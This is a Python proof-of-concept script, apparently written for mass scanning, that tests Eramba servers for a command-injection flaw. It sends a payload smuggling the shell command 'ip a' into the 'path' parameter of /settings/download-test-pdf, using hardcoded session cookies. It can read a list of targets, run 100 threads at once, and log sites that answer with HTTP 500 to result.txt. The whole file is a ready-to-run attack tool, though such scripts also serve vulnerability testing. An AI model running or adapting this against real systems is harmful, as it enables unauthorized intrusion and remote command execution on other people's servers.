import requests
import re
import argparse
import sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """                                                            
___________                    ___.           
\_   _____/___________    _____\_ |__ _____   
 |    __)_\_  __ \__  \  /     \| __ \\__  \  
 |        \|  | \// __ \|  Y Y  \ \_\ \/ __ \_
/_______  /|__|  (____  /__|_|  /___  (____  /
        \/            \/      \/    \/     \/ 
                               author:gtman       
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="Eramba存在任意代码执行漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help="Please input link")
    parser.add_argument('-f', '--file', dest='file', type=str, help="Please input file path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding="utf-8") as f:
            for line in f.readlines():
                url_list.append(line.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")

def poc(target):
    headers = {
        'Cookie': 'translation=1; csrfToken=1l2rXXwj1D1hVyVRH%2B1g%2BzIzYTA3OGFiNWRjZWVmODQ1OTU1NWEyODM2MzIwZTZkZTVlNmU1YjY%3D; PHPSESSID=14j6sfroe6t2g1mh71g2a1vjg8',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': f'{target}/settings',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Te': 'trailers',
        'Connection': 'close'
    }
    proxies = {
        'http': "http://127.0.0.1:8080",
        'https': "http://127.0.0.1:8080"
    }
    payload = '/settings/download-test-pdf?path=ip%20a;'
    try:
        response = requests.get(url=target + payload, headers=headers, verify=False,proxies=proxies)
        if response.status_code == 500:
            print(f"[*] 该站点 {target} 可能存在代码执行漏洞，请手动复现")
            with open("result.txt", "a") as fp:
                fp.write(f"{target}" + "\n")
        else:
            print(f"[-] 该站点 {target} 不存在代码执行漏洞")
    except Exception as e:
        print(f"[+] 该站点 {target} 存在访问问题，请手工测试")

if __name__ == "__main__":
    main()